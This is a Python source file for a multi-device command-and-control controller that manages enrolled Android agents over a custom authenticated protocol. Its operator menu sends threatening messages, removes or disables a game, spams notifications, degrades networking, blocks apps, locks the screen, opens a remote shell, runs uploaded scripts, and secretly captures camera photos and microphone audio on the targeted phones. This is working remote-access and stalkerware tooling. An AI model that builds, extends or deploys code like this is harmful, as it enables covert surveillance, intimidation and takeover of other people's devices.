"""Multi-device v2 controller layer.

Builds on top of the classic controller.py framing (4-byte BE length + UTF-8).
The classic single-device PhoneController stays untouched in controller.py
(this module does not modify it). The v2 protocol multiplexed on the framing:

  AGENT_HELLO|<id>|<proto>|<ver>|<nonce>|<auth>|<caps>|<state>  agent -> ctrl
  HELLO_OK|<proto>|<ver>|<nonceSrv>|<authSrv>[|<TOKEN=...>]    ctrl -> agent
  AUTH_DENIED|<reason>                                         ctrl -> agent
  PING|<seq>  ->  PONG|<seq>                       heartbeat
  cmd|<id>|<b64>  ->  ACK|<id>  then  RESULT|<id>|OK|<b64> | RESULT|<id>|ERR|<b64>
  STATE_REQ|<id>  ->  RESULT with the device state snapshot
  NOTIFY|<b64>                                  async push from the device
  CTRL_EXIT|...                                 stop the device service
  SET_CTRL|<ip>|<port>                          endpoint hand-over

Authentication: the 32-byte per-device token is only sent once during
enrollment (TOKEN=...). Every later handshake proves knowledge of the token
with HMAC-SHA256 (device side and controller side mutually).
"""

import base64
import datetime
import hashlib
import hmac as _hmac
import json
import os
import secrets
import socket
import sys
import threading
import time
import uuid

from controller import (
    BASE_DIR,
    HOST,
    MESSAGE_DASHBOARD,
    MAX_MESSAGE_SIZE,
    PORT,
    SCRIPT_MAX_BYTES,
    _PACKAGE_NAME_RE,
    _image_to_base64,
    _parse_duration,
    _parse_int_in_range,
    _parse_script_delay,
    _validate_image,
    receive_message,
    scan_audio_library,
    scan_video_library,
    send_message,
)

PROTOCOL_VERSION = "2"
CONTROLLER_VERSION = "1.0.0"

BEACON_GROUP = "239.255.0.42"
BEACON_PORT = 45999
BEACON_PERIOD_S = 3

HEARTBEAT_INTERVAL_S = 10
HEARTBEAT_DEGRADE_AFTER_S = 30
HEARTBEAT_OFFLINE_AFTER_S = 60

SESSIONS_DIR = os.path.join(BASE_DIR, "controller_state")
DEVICES_FILE = os.path.join(SESSIONS_DIR, "devices.json")
GROUPS_FILE = os.path.join(SESSIONS_DIR, "groups.json")

DEVICE_STATE_UNKNOWN = "UNKNOWN"
DEVICE_STATE_DISCOVERED = "DISCOVERED"
DEVICE_STATE_PAIRING = "PAIRING"
DEVICE_STATE_AUTHENTICATING = "AUTHENTICATING"
DEVICE_STATE_CONNECTED = "CONNECTED"
DEVICE_STATE_DEGRADED = "DEGRADED"
DEVICE_STATE_RECONNECTING = "RECONNECTING"
DEVICE_STATE_OFFLINE = "OFFLINE"

# Exact mirror of the classic PhoneController menu (controller.py). The v2 run
# screen reuses these labels so the operator UX stays recognizable; tests guard
# this parity.
RUN_MENU_LINES = [
    "1. Show threatening message",
    "2. Remove Free Fire",
    "3. Disable Free Fire",
    "4. Send repeated notifications",
    "5. Play sound",
    "6. Change wallpaper",
    "7. Show black screen on boot",
    "8. Network degradation",
    "9. Block other apps",
    "10. Android Shell",
    "11. Run script",
    "12. Show device info",
    "13. Capture camera photo",
    "14. Record microphone audio",
    "15. Block screen (strict managed lock)",
    "16. Play fullscreen video",
    "17. Show serious warning message",
    "18. Exit",
]


def build_beacon(port, proto=PROTOCOL_VERSION, ver=CONTROLLER_VERSION):
    """The UDP discovery beacon broadcast on the multicast group."""
    return f"SNOPT_BEACON|{_local_ip()}|{port}|{proto}|{ver}"


def _b64(text):
    return base64.b64encode(text.encode("utf-8")).decode("ascii")


def _unb64(text):
    try:
        return base64.b64decode(text).decode("utf-8")
    except Exception:
        return ""


def _hmac_hex(secret_bytes, data):
    return _hmac.new(secret_bytes, data.encode("utf-8"), hashlib.sha256).hexdigest()


def _local_ip():
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception:
        return "127.0.0.1"


# ----------------------------------------------------------------------
# Persistent state storage
# ----------------------------------------------------------------------


class DeviceRegistry:
    """Persistent per-device identity and enrollment secrets (JSON file)."""

    def __init__(self, path=DEVICES_FILE):
        self.path = path
        self.devices = {}
        self._lock = threading.Lock()
        self._load()

    def _load(self):
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                self.devices = json.load(f)
        except (OSError, ValueError):
            self.devices = {}

    def save(self):
        try:
            os.makedirs(os.path.dirname(self.path), exist_ok=True)
            tmp = self.path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.devices, f, ensure_ascii=False, indent=2)
            os.replace(tmp, self.path)
        except OSError as e:
            print(f"registry save failed: {e}")

    def token_b64(self, device_id):
        with self._lock:
            entry = self.devices.get(device_id)
            return entry.get("token_b64") if entry else None

    def token_bytes(self, device_id):
        b64 = self.token_b64(device_id)
        if not b64:
            return None
        try:
            return base64.b64decode(b64)
        except Exception:
            return None

    def token_matches(self, device_id, token_b64):
        return _hmac.compare_digest(str(self.token_b64(device_id) or ""), str(token_b64 or ""))

    def enroll(self, device_id):
        """Create a fresh enrollment secret; returns the base64 token."""
        with self._lock:
            token_b64 = base64.b64encode(secrets.token_bytes(32)).decode("ascii")
            entry = self.devices.setdefault(device_id, {})
            entry["token_b64"] = token_b64
            now = datetime.datetime.now().isoformat(timespec="seconds")
            entry.setdefault("first_seen", now)
            entry["last_seen"] = now
            self.save()
            return token_b64

    def update(self, device_id, **fields):
        with self._lock:
            entry = self.devices.setdefault(device_id, {})
            entry.update(fields)
            entry["last_seen"] = datetime.datetime.now().isoformat(timespec="seconds")
            self.save()

    def remove(self, device_id):
        with self._lock:
            self.devices.pop(device_id, None)
            self.save()

    def rename(self, device_id, name):
        with self._lock:
            entry = self.devices.setdefault(device_id, {})
            entry["name"] = name
            self.save()


class GroupStore:
    """Persistent groups: {name: [device_ids]}."""

    def __init__(self, path=GROUPS_FILE):
        self.path = path
        self.groups = {}
        self._lock = threading.Lock()
        self._load()

    def _load(self):
        try:
            with open(self.path, "r", encoding="utf-8") as f:
                self.groups = json.load(f)
        except (OSError, ValueError):
            self.groups = {}

    def save(self):
        try:
            os.makedirs(os.path.dirname(self.path), exist_ok=True)
            tmp = self.path + ".tmp"
            with open(tmp, "w", encoding="utf-8") as f:
                json.dump(self.groups, f, ensure_ascii=False, indent=2)
            os.replace(tmp, self.path)
        except OSError as e:
            print(f"groups save failed: {e}")

    def create(self, name, device_ids):
        with self._lock:
            self.groups[name] = list(dict.fromkeys(device_ids))
            self.save()

    def rename(self, old, new):
        with self._lock:
            if old not in self.groups or new in self.groups:
                return False
            self.groups[new] = self.groups.pop(old)
            self.save()
        return True

    def remove(self, name):
        with self._lock:
            if name in self.groups:
                del self.groups[name]
                self.save()

    def set_devices(self, name, device_ids):
        with self._lock:
            self.groups[name] = list(dict.fromkeys(device_ids))
            self.save()

    def add_device(self, name, device_id):
        with self._lock:
            entries = self.groups.setdefault(name, [])
            if device_id not in entries:
                entries.append(device_id)
                self.save()

    def remove_device(self, name, device_id):
        with self._lock:
            entries = self.groups.get(name)
            if entries and device_id in entries:
                entries.remove(device_id)
                self.save()


# ----------------------------------------------------------------------
# Handshake
# ----------------------------------------------------------------------


def parse_agent_hello(frame):
    if not frame.startswith("AGENT_HELLO|"):
        return None
    parts = frame.split("|")
    if len(parts) < 7:
        return None
    return {
        "device_id": parts[1],
        "proto": parts[2],
        "version": parts[3],
        "nonce": parts[4],
        "auth": parts[5],
        "caps": parts[6],
        "state": "|".join(parts[7:]),
    }


def build_hello_ok(proto, server_version, nonce_srv, auth_srv, token_b64=None):
    frame = f"HELLO_OK|{proto}|{server_version}|{nonce_srv}|{auth_srv}"
    if token_b64:
        frame += f"|TOKEN={token_b64}"
    return frame


def perform_server_handshake(sock, registry, auto_enroll=True, prompt_cb=None):
    """Read the agent HELLO and reply. Returns (device_id, conninfo) or None."""
    old_timeout = sock.gettimeout()
    try:
        sock.settimeout(20)
        hello_frame = receive_message(sock)
    except Exception:
        return None
    finally:
        try:
            sock.settimeout(old_timeout)
        except OSError:
            pass

    info = parse_agent_hello(hello_frame)
    if info is None:
        return None

    device_id = info["device_id"]
    token = registry.token_bytes(device_id)

    if token is not None:
        expected = _hmac_hex(token, f"{device_id}:{info['nonce']}")
        if _hmac.compare_digest(expected, info["auth"]):
            nonce_srv = secrets.token_hex(16)
            auth_srv = _hmac_hex(token, "hellook:" + info["nonce"])
            try:
                send_message(sock, build_hello_ok(info["proto"], CONTROLLER_VERSION,
                                                  nonce_srv, auth_srv))
            except OSError:
                return None
            return device_id, info
        # Known device but the signature does not match (stale/factory token,
        # reinstall or registry reset). Under trust-on-first-use (auto_enroll)
        # this is a rekey, exactly like a first contact. With interactive
        # enrollment it is refused.
        if not auto_enroll:
            try:
                send_message(sock, "AUTH_DENIED|token_mismatch")
            except OSError:
                pass
            return None

    accepted = auto_enroll
    if not accepted and prompt_cb is not None:
        try:
            accepted = prompt_cb(device_id)
        except Exception:
            accepted = False
    if not accepted:
        try:
            send_message(sock, "AUTH_DENIED|device_not_enrolled")
        except OSError:
            pass
        return None

    token_b64 = registry.enroll(device_id)
    try:
        token = base64.b64decode(token_b64)
    except Exception:
        return None
    nonce_srv = secrets.token_hex(16)
    auth_srv = _hmac_hex(token, "hellook:" + info["nonce"])
    try:
        send_message(sock, build_hello_ok(info["proto"], CONTROLLER_VERSION,
                                          nonce_srv, auth_srv, token_b64))
    except OSError:
        return None
    return device_id, info


# ----------------------------------------------------------------------
# Per-device session
# ----------------------------------------------------------------------


class DeviceSession:
    def __init__(self, sock, address, device_id, controller):
        self.sock = sock
        self.address = address
        self.device_id = device_id
        self.controller = controller
        self.state = DEVICE_STATE_CONNECTED
        self.last_pong = time.time()
        self.ping_seq = 0
        self.send_lock = threading.Lock()
        self._results = {}
        self._events = {}
        self.closed = False

    def send(self, frame):
        with self.send_lock:
            send_message(self.sock, frame)

    def start(self):
        t = threading.Thread(target=self._reader,
                             name=f"session-{self.device_id[:12]}", daemon=True)
        t.start()

    def _reader(self):
        while not self.controller.running and not self.closed:
            time.sleep(0.05)
        while not self.closed:
            try:
                frame = receive_message(self.sock)
            except Exception:
                break
            if frame is None:
                break
            try:
                self.controller.on_session_frame(self, frame)
            except Exception:
                pass
        self.controller.on_session_gone(self)

    def ack_result(self, cid):
        event = self._events.get(cid)
        if event is not None:
            with event.cond:
                event.acked = True
                event.cond.notify_all()

    def push_result(self, cid, status, payload):
        self._results[cid] = (status, payload)
        event = self._events.get(cid)
        if event is not None:
            with event.cond:
                event.done = True
                event.cond.notify_all()

    def new_command(self):
        return secrets.token_hex(6)

    def wait_result(self, cid, timeout=60):
        event = self._events.setdefault(cid, _CmdTicket())
        deadline = time.time() + timeout
        with event.cond:
            while not event.done and time.time() < deadline:
                event.cond.wait(max(0.05, deadline - time.time()))
        self._events.pop(cid, None)
        return self._results.pop(cid, ("MISSING", ""))

    def close(self):
        if self.closed:
            return
        self.closed = True
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            self.sock.close()
        except OSError:
            pass


class _CmdTicket:
    def __init__(self):
        self.cond = threading.Condition()
        self.acked = False
        self.done = False


class _AbortCommand(Exception):
    pass


# ----------------------------------------------------------------------
# Multi-device controller
# ----------------------------------------------------------------------


class MainController:
    def __init__(self, host=HOST, port=PORT, auto_enroll=True):
        self.host = host
        self.port = port
        self.auto_enroll = auto_enroll
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(16)
        self.server.settimeout(2)
        self.registry = DeviceRegistry()
        self.groups = GroupStore()
        self.sessions = {}
        self.sessions_lock = threading.Lock()
        self.selected = set()
        self.running = False

    # ------------------------------------------------------------------

    def run(self):
        self.running = True
        print(f"Multi-device controller listening on {self.host}:{self.port} "
              f"(protocol v{PROTOCOL_VERSION})")
        print(f"Enrollment: {'automatic' if self.auto_enroll else 'interactive'}")
        print("Type 'h' for help.")
        threading.Thread(target=self._accept_loop, name="accept", daemon=True).start()
        threading.Thread(target=self._beacon_loop, name="beacon", daemon=True).start()
        threading.Thread(target=self._heartbeat_loop, name="heartbeat", daemon=True).start()
        try:
            self._cli_loop()
        except (KeyboardInterrupt, EOFError):
            print("\nShutting down.")
        finally:
            self.shutdown()

    def shutdown(self):
        self.running = False
        with self.sessions_lock:
            sessions = list(self.sessions.values())
            self.sessions.clear()
        for s in sessions:
            s.close()
        try:
            self.server.close()
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Background threads
    # ------------------------------------------------------------------

    def _accept_loop(self):
        while self.running:
            try:
                sock, address = self.server.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            if not self.running:
                try:
                    sock.close()
                except OSError:
                    pass
                break
            threading.Thread(target=self._handle_connection,
                             args=(sock, address), name="handshake", daemon=True).start()

    def _handle_connection(self, sock, address):
        result = perform_server_handshake(sock, self.registry,
                                          auto_enroll=self.auto_enroll,
                                          prompt_cb=self._interactive_enroll)
        if result is None:
            try:
                sock.close()
            except OSError:
                pass
            return
        device_id, info = result
        print(f"[+] paired device {device_id} from {address[0]}:{address[1]} "
              f"(proto {info['proto']})")

        with self.sessions_lock:
            old = self.sessions.get(device_id)
            if old is not None:
                old.close()
            session = DeviceSession(sock, address, device_id, self)
            self.sessions[device_id] = session
        state_fields = dict(
            (k, v) for k, v in (
                part.split("=", 1) for part in info["state"].split(";") if "=" in part))
        self.registry.update(device_id,
                             state=DEVICE_STATE_CONNECTED,
                             model=state_fields.get("model", ""),
                             caps=info["caps"],
                             state_payload=info["state"])
        session.start()

    def _interactive_enroll(self, device_id):
        try:
            answer = input(f"Enroll new device {device_id}? [y/N]: ").strip().lower()
            return answer in ("y", "yes")
        except (EOFError, KeyboardInterrupt):
            return False

    def _heartbeat_loop(self):
        while self.running:
            self._heartbeat_tick()
            for _ in range(HEARTBEAT_INTERVAL_S * 10):
                if not self.running:
                    return
                time.sleep(0.1)

    def _heartbeat_tick(self):
        now = time.time()
        with self.sessions_lock:
            sessions = list(self.sessions.values())
        for s in sessions:
            if s.closed:
                continue
            if now - s.last_pong > HEARTBEAT_OFFLINE_AFTER_S:
                if s.state != DEVICE_STATE_OFFLINE:
                    s.state = DEVICE_STATE_OFFLINE
                    print(f"[!] {s.device_id} went OFFLINE (heartbeat lost)")
                s.close()
                continue
            if now - s.last_pong > HEARTBEAT_DEGRADE_AFTER_S and \
                    s.state != DEVICE_STATE_DEGRADED:
                s.state = DEVICE_STATE_DEGRADED
                print(f"[!] {s.device_id} DEGRADED (weak heartbeat)")
            s.ping_seq += 1
            try:
                s.send(f"PING|{s.ping_seq}")
            except OSError:
                s.close()

    def _beacon_loop(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        except OSError:
            pass
        beacon = build_beacon(self.port)
        while self.running:
            try:
                s.sendto(beacon.encode("utf-8"), (BEACON_GROUP, BEACON_PORT))
            except OSError:
                pass
            for _ in range(BEACON_PERIOD_S * 10):
                if not self.running:
                    try:
                        s.close()
                    except OSError:
                        pass
                    return
                time.sleep(0.1)
        try:
            s.close()
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Session frames
    # ------------------------------------------------------------------

    def on_session_frame(self, session, frame):
        if frame is None:
            return
        if frame.startswith("PONG|"):
            session.last_pong = time.time()
            if session.state == DEVICE_STATE_DEGRADED:
                session.state = DEVICE_STATE_CONNECTED
                print(f"[+] {session.device_id} heartbeat restored (CONNECTED)")
            return
        if frame.startswith("ACK|"):
            session.ack_result(frame[len("ACK|"):].strip())
            return
        if frame.startswith("RESULT|"):
            parts = frame.split("|", 4)
            if len(parts) < 4:
                return
            session.push_result(parts[1], parts[2], _unb64(parts[3]))
            return
        if frame.startswith("NOTIFY|"):
            print(f"[notify:{session.device_id}] {_unb64(frame[len('NOTIFY|'):])}")
            return
        print(f"[?] {session.device_id} unknown frame: {frame[:80]}")

    def on_session_gone(self, session):
        with self.sessions_lock:
            if self.sessions.get(session.device_id) is session:
                self.sessions.pop(session.device_id, None)
        session.close()
        self.selected.discard(session.device_id)
        self.registry.update(session.device_id, state=DEVICE_STATE_OFFLINE)
        print(f"[-] {session.device_id} disconnected (OFFLINE)")

    # ------------------------------------------------------------------
    # Routing
    # ------------------------------------------------------------------

    def connected_ids(self):
        with self.sessions_lock:
            return [did for did, s in self.sessions.items()
                    if not s.closed and s.state in (DEVICE_STATE_CONNECTED,
                                                    DEVICE_STATE_DEGRADED)]

    def all_registered_ids(self):
        return list(self.registry.devices.keys())

    def target_ids(self):
        if self.selected:
            return list(self.selected)
        return self.connected_ids()

    def dispatch(self, command_text, target_ids, timeout=60, show=True):
        if not target_ids:
            print("Result: no target devices available.")
            return {}
        sent = []
        with self.sessions_lock:
            sessions = {did: self.sessions.get(did) for did in target_ids}
        for did in target_ids:
            s = sessions.get(did)
            if s is None or s.closed:
                print(f"{did:<24} SKIPPED (not connected)")
                continue
            cid = s.new_command()
            s._events.setdefault(cid, _CmdTicket())
            try:
                s.send(f"cmd|{cid}|{_b64(command_text)}")
                sent.append((did, cid))
            except OSError as e:
                print(f"{did:<24} SEND FAILED: {e}")
        outcomes = {}
        for did, cid in sent:
            status, payload = sessions[did].wait_result(cid, timeout)
            outcomes[did] = (status, payload)
            if show:
                print(f"{did:<24} [{status}] {payload[:500]}")
        return outcomes

    def request_state(self, device_id, timeout=15):
        s = self.sessions.get(device_id)
        if s is None or s.closed:
            return None
        cid = s.new_command()
        s._events.setdefault(cid, _CmdTicket())
        try:
            s.send(f"STATE_REQ|{cid}")
        except OSError:
            return None
        status, payload = s.wait_result(cid, timeout)
        return payload

    def send_control(self, device_id, frame):
        s = self.sessions.get(device_id)
        if s is None or s.closed:
            return False
        try:
            s.send(frame)
            return True
        except OSError:
            return False

    # ------------------------------------------------------------------
    # Interactive command builders (send to all selected devices)
    # ------------------------------------------------------------------

    def _cli_loop(self):
        while self.running:
            try:
                choice = input("controller> ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                break
            if choice in ("h", "help", "?"):
                self._print_help()
            elif choice in ("q", "quit"):
                break
            elif choice in ("a", "devices"):
                self._devices_screen()
            elif choice in ("r", "run"):
                self._run_screen()
            elif choice in ("g", "groups"):
                self._groups_screen()
            elif choice in ("s", "status"):
                self._status_screen()
            elif choice in ("p", "pairing"):
                self._pairing_screen()
            elif choice in ("k", "kill"):
                self._shutdown_devices()
            else:
                print("Unknown command (h for help).")

    def _print_help(self):
        print("  a  devices: list + select targets")
        print("  r  run:     run a command on the selected devices")
        print("  g  groups:  manage persistent device groups")
        print("  s  status:  per-device diagnostics")
        print("  p  pairing: manage enrolled devices")
        print("  k  kill:    stop the remote agent services")
        print("  q  quit:    close the controller")

    def _devices_screen(self):
        registered = self.all_registered_ids()
        if not registered:
            print("No devices registered yet (waiting for agents to connect).")
            return
        print(f"{'#':<3} {'status':<12} {'sel':<4} device")
        for i, did in enumerate(registered, start=1):
            with self.sessions_lock:
                s = self.sessions.get(did)
            state = s.state if s is not None else DEVICE_STATE_OFFLINE
            mark = "x" if did in self.selected else " "
            print(f"{i:<3} {state:<12} {mark:<4} {did}")
        while True:
            try:
                line = input("device> ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                return
            if not line:
                return
            if line in ("all",):
                self.selected = set(self.connected_ids())
                print("selected all connected devices.")
                return
            if line in ("none", "clear"):
                self.selected.clear()
                print("selection cleared.")
                return
            try:
                idx = int(line)
            except ValueError:
                print("Usage: <number> | all | none | <Enter> to exit")
                continue
            if not (1 <= idx <= len(registered)):
                print("Number out of range.")
                continue
            did = registered[idx - 1]
            if did in self.selected:
                self.selected.discard(did)
                print(f"{did}: deselected.")
            else:
                self.selected.add(did)
                print(f"{did}: selected.")

    def _run_screen(self):
        targets = self.target_ids()
        if not targets:
            print("No connected target devices. Use 'a' to select, or wait for "
                  "a device to connect.")
            return
        if len(targets) > 1:
            print(f"Targets ({len(targets)}): " + ", ".join(targets))
        for line in RUN_MENU_LINES:
            print(line)
        try:
            choice = input("Choose an operation: ").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice == "18":
            return
        timeout = 60
        if choice in ("13",):
            timeout = 150
        if choice == "14":
            timeout = 660
        try:
            command = self._build_command(choice)
        except _AbortCommand:
            return
        if command is None:
            return
        self.dispatch(command, targets, timeout)

    def _build_command(self, choice):
        if choice == "1":
            text = input("Message text (empty = predefined threat messages): ").strip()
            if text:
                return f"show_message:txt:{text}"
            idx = input("Predefined message index (1-%d, 0=none): " % len(MESSAGE_DASHBOARD)).strip()
            idx = _parse_int_in_range(idx, 1, len(MESSAGE_DASHBOARD))
            if idx is None:
                print("Result: Error - choose a number between 1 and %d." % len(MESSAGE_DASHBOARD))
                return None
            return f"show_message:idx:{idx}"
        if choice == "2":
            return "remove_freefire"
        if choice == "3":
            return "disable_freefire"
        if choice == "4":
            count = input("Number of notifications (1-500): ").strip()
            if _parse_int_in_range(count, 1, 500) is None:
                print("Result: Error - count must be 1-500.")
                return None
            message = input("Message text: ").strip() or "تحذير"
            return f"spam_notifications:{count}:{message}"
        if choice == "5":
            return self._build_sound()
        if choice == "6":
            return self._build_wallpaper()
        if choice == "7":
            return "black_screen_on_boot"
        if choice == "8":
            return self._build_network_deg()
        if choice == "9":
            package = input("App package name: ").strip()
            if not _PACKAGE_NAME_RE.match(package):
                print("Result: INVALID PACKAGE NAME / PACKAGE NOT FOUND: invalid package name.")
                return None
            return f"block_app:{package}"
        if choice == "10":
            self._interactive_shell(self.target_ids()[0])
            raise _AbortCommand()
        if choice == "11":
            return self._build_script()
        if choice == "12":
            return "device_info"
        if choice == "13":
            return "capture_camera"
        if choice == "14":
            duration = input("Duration in seconds (1-600): ").strip()
            if _parse_int_in_range(duration, 1, 600) is None:
                print("Result: Error - duration must be 1-600.")
                return None
            return f"record_audio:{duration}"
        if choice == "15":
            return self._build_block_screen()
        if choice == "16":
            return self._build_video()
        if choice == "17":
            text = input("Warning text: ").strip()
            if not text:
                print("Result: Error - warning text is empty.")
                return None
            return f"show_serious_warning:{text}"
        print("Invalid choice")
        return None

    def _build_sound(self):
        print("\n--- Sound Library ---")
        library = scan_audio_library()
        if not library:
            print("Result: Error - no audio files found.")
            return None
        for sound_id, filename in library:
            print(f"{sound_id}. {filename}")
        print("0. Back")
        choice = input("Choose a sound (0 to go back): ").strip()
        if choice == "0":
            return None
        sound_id = _parse_int_in_range(choice, 1, len(library))
        if sound_id is None:
            print("Result: Error - invalid sound id.")
            return None
        duration = input("Duration in seconds (1-600): ").strip()
        if _parse_int_in_range(duration, 1, 600) is None:
            print("Result: Error - duration must be 1-600.")
            return None
        return f"play_sound:{sound_id}:{duration}"

    def _build_wallpaper(self):
        image_path = input("Image path: ").strip()
        duration = input("Duration (seconds): ").strip()
        if _parse_duration(duration) is None:
            print("Result: Error - duration must be a positive integer.")
            return None
        image_info = _validate_image(image_path)
        if image_info is None:
            print("Result: Error - file not found or not a valid image.")
            return None
        if image_info[0] > MAX_MESSAGE_SIZE:
            print("Result: Error - image too large.")
            return None
        b64 = _image_to_base64(image_path)
        if b64 is None:
            print("Result: Error - failed to read image data.")
            return None
        return f"change_wallpaper_base64:{duration}:{b64}"

    def _build_network_deg(self):
        latency = input("Latency (ms) [0-5000, 0 = none]: ").strip() or "0"
        loss = input("Packet loss (%) [0-100, 0 = none]: ").strip() or "0"
        bandwidth = input("Bandwidth limit (kbps) [0 = none, Enter for none]: ").strip() or "0"
        duration = input("Duration (seconds): ").strip()
        if _parse_duration(duration) is None:
            print("Result: Error - invalid duration.")
            return None
        if _parse_int_in_range(latency, 0, 5000) is None \
                or _parse_int_in_range(loss, 0, 100) is None \
                or _parse_int_in_range(bandwidth, 0, 10_000_000) is None:
            print("Result: Error - invalid degradation parameters.")
            return None
        if int(latency) == 0 and int(loss) == 0 and int(bandwidth) == 0:
            print("Result: Error - no degradation parameters specified (all zero).")
            return None
        return f"network_deg:{latency}:{loss}:{bandwidth}:{duration}"

    def _build_script(self):
        script_path = input("Script path: ").strip()
        delay = input("Run after (seconds) [0 = immediately]: ").strip() or "0"
        if _parse_script_delay(delay) is None:
            print("Result: Error - invalid delay.")
            return None
        if not os.path.isfile(script_path):
            print("Result: Error - script file not found.")
            return None
        size = os.path.getsize(script_path)
        if size == 0 or size > SCRIPT_MAX_BYTES:
            print("Result: Error - script file invalid size (empty or too large).")
            return None
        with open(script_path, "r", encoding="utf-8-sig", errors="replace") as f:
            content = f.read()
        if not content.strip():
            print("Result: Error - script content is empty.")
            return None
        return f"script_base64:{delay}:{_b64(content)}"

    def _build_video(self):
        print("\n--- Video Library ---")
        library = scan_video_library()
        if not library:
            print("Result: Error - no videos found.")
            return None
        for vid, filename in library:
            print(f"{vid}. {filename}")
        print("0. Back")
        choice = input("Choose a video (0 to go back): ").strip()
        if choice == "0":
            return None
        video_id = _parse_int_in_range(choice, 1, 10_000_000)
        if video_id is None:
            print("Result: Error - invalid video id.")
            return None
        if not any(vid == video_id for vid, _ in library):
            print(f"Result: Error - video id {video_id} is not in the library.")
            return None
        return f"play_video:{video_id}"

    def _build_block_screen(self):
        duration = input("Duration in seconds (1-86400): ").strip()
        if _parse_duration(duration) is None:
            print("Result: Error - duration must be an integer between 1 and 86400.")
            return None
        mode = input("Mode (1=start now, 2=scheduled): ").strip()
        delay = 0
        if mode == "2":
            delay_str = input("Start delay in seconds (0-86400): ").strip()
            delay = _parse_int_in_range(delay_str, 0, 86400)
            if delay is None:
                print("Result: Error - delay must be 0-86400.")
                return None
        elif mode != "1":
            print("Result: Error - choose 1 (start now) or 2 (scheduled).")
            return None
        session_id = input("Session ID (optional, Enter to auto-generate): ").strip()
        if session_id and not session_id.replace("-", "").replace("_", "").isalnum():
            print("Result: Error - session id must be alphanumeric.")
            return None
        if not session_id:
            session_id = "BS-" + uuid.uuid4().hex[:8].upper()
        return f"block_screen:{duration}:{delay}:{session_id}"

    def _interactive_shell(self, device_id):
        s = self.sessions.get(device_id)
        if s is None or s.closed:
            print(f"{device_id} is not connected.")
            return
        print(f"Android Shell on {device_id} (type 'exit' to leave, '!quit' to force).")
        cid = s.new_command()
        s._events.setdefault(cid, _CmdTicket())
        try:
            s.send(f"cmd|{cid}|{_b64('shell_start')}")
            status, payload = s.wait_result(cid, 20)
        except OSError:
            return
        print(f"[{status}] {payload}")
        if "SHELL_SESSION_STARTED" not in payload:
            return
        while True:
            try:
                line = input(f"$ {device_id}> ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if not line:
                continue
            if line == "exit":
                break
            cid = s.new_command()
            s._events.setdefault(cid, _CmdTicket())
            try:
                s.send(f"cmd|{cid}|{_b64('shell_cmd:' + _b64(line))}")
                status, payload = s.wait_result(cid, 90)
            except OSError:
                print(f"{device_id}: lost connection.")
                return
            print(payload if status == "OK" else f"[{status}] {payload}")
        cid = s.new_command()
        s._events.setdefault(cid, _CmdTicket())
        try:
            s.send(f"cmd|{cid}|{_b64('shell_exit')}")
            s.wait_result(cid, 20)
        except OSError:
            pass

    # ------------------------------------------------------------------
    # Groups / status / pairing screens
    # ------------------------------------------------------------------

    def _groups_screen(self):
        print("Groups:", ", ".join(self.groups.groups.keys()) or "(none)")
        while True:
            try:
                line = input("groups> ").strip()
            except (EOFError, KeyboardInterrupt):
                return
            if not line:
                return
            parts = line.split()
            verb = parts[0].lower()
            if verb == "new" and len(parts) >= 2:
                self.groups.create(parts[1], self.target_ids())
                print(f"group {parts[1]} := {self.target_ids()}")
            elif verb == "show":
                for name, devices in self.groups.groups.items():
                    print(f"{name}: {', '.join(devices) or '(empty)'}")
            elif verb == "add" and len(parts) >= 3:
                for did in parts[2:]:
                    self.groups.add_device(parts[1], did)
                print("added.")
            elif verb == "del" and len(parts) >= 3:
                for did in parts[2:]:
                    self.groups.remove_device(parts[1], did)
                print("removed.")
            elif verb in ("rm", "delete") and len(parts) >= 2:
                self.groups.remove(parts[1])
                print("deleted.")
            elif verb == "rename" and len(parts) >= 3:
                ok = self.groups.rename(parts[1], parts[2])
                print("renamed." if ok else "name conflict.")
            elif verb == "run" and len(parts) >= 2:
                name = parts[1]
                ids = self.groups.groups.get(name)
                if ids is None:
                    print(f"unknown group {name}")
                    continue
                cmd_line = input(f"run '{name}' command: ").strip()
                if cmd_line:
                    self.dispatch(cmd_line, ids)
            else:
                print("Commands: new NAME | add NAME DID... | del NAME DID... | "
                      "rm NAME | rename OLD NEW | show | run NAME")

    def _status_screen(self):
        ids = self.connected_ids() or self.all_registered_ids()
        if not ids:
            print("No devices.")
            return
        for did in ids:
            with self.sessions_lock:
                s = self.sessions.get(did)
            if s is None or s.closed:
                print(f"{did}  OFFLINE")
                continue
            state = self.request_state(did)
            print(f"{did}  {s.state}")
            if state:
                for field in state.split(";"):
                    k, _, v = field.partition("=")
                    print(f"    {k}: {v}")
            else:
                print("    (state request failed)")

    def _pairing_screen(self):
        names = self.registry.devices
        print("Enrolled devices:")
        for did, entry in sorted(names.items()):
            print(f"  {did:<42} name={entry.get('name', '-')} "
                  f"last={entry.get('last_seen', '-')}")
        while True:
            try:
                line = input("pairing> ").strip()
            except (EOFError, KeyboardInterrupt):
                return
            if not line:
                return
            parts = line.split()
            verb = parts[0].lower()
            if verb == "remove" and len(parts) >= 2:
                self.registry.remove(parts[1])
                self.selected.discard(parts[1])
                print("removed.")
            elif verb == "name" and len(parts) >= 3:
                self.registry.rename(parts[1], " ".join(parts[2:]))
                print("renamed.")
            else:
                print("Commands: remove DEVICE_ID | name DEVICE_ID NEW_NAME")

    def _shutdown_devices(self):
        ids = self.connected_ids()
        if not ids:
            print("No connected devices.")
            return
        for did in ids:
            if self.send_control(did, "CTRL_EXIT|stop"):
                print(f"sent stop request to {did}")


